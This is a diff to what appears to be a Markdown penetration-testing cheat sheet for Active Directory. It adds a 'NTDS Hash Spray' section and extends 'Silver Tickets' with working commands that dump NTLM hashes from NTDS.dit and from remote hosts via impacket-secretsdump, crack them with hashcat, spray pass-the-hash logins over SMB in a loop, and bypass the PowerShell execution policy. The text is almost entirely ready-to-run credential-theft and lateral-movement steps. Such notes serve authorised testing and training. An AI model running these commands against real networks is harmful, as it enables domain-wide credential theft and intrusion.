@@ -168,12 +168,40 @@ grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds
 grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds | cut -d ':' -f1
 ```
 
+### NTDS Hash Spray
+
+#Hash #SMB #ActiveDirectory #CredentialDumping
+Extract NTLM hashes from offline `secretsdump` output, try cracking, then carefully test pass-the-hash when cracking does not work.
+
+```sh
+# Dump hashes from copied NTDS.DIT and SYSTEM files.
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee allhashes.txt
+
+# Keep user:NTLM pairs and remove obvious disabled/machine accounts.
+grep ':::' allhashes.txt | grep -viE '^(guest|krbtgt|.*\$):' | awk -F: '{print $1 ":" $4}' | sort -u > hashes_crack.txt
+
+# Try cracking with username-aware input.
+hashcat -m 1000 --username hashes_crack.txt <WORDLIST> -r /usr/share/hashcat/rules/best66.rule
+
+# If cracking fails, test collected NTLM hashes carefully.
+while IFS=: read -r u h; do
+  nxc smb <TARGET_IP> -u "$u" -H "$h" --continue-on-success
+done < hashes_crack.txt
+```
+
 ### Silver Tickets
 
 #Shell #Kerberos #ActiveDirectory #Persistence
 Forge and inject a Silver Ticket with a service account NTLM hash.
 
 ```powershell
+# Attacker: get the domain SID.
+impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP> | findstr /i "Domain SID"
+
+# Attacker: dump or identify the target service account hash.
+impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>
+
+# Target Windows shell: verify current access, then inject the ticket.
 powershell -ep bypass
 iwr -UseDefaultCredentials http://<TARGET_WEB>
 klist
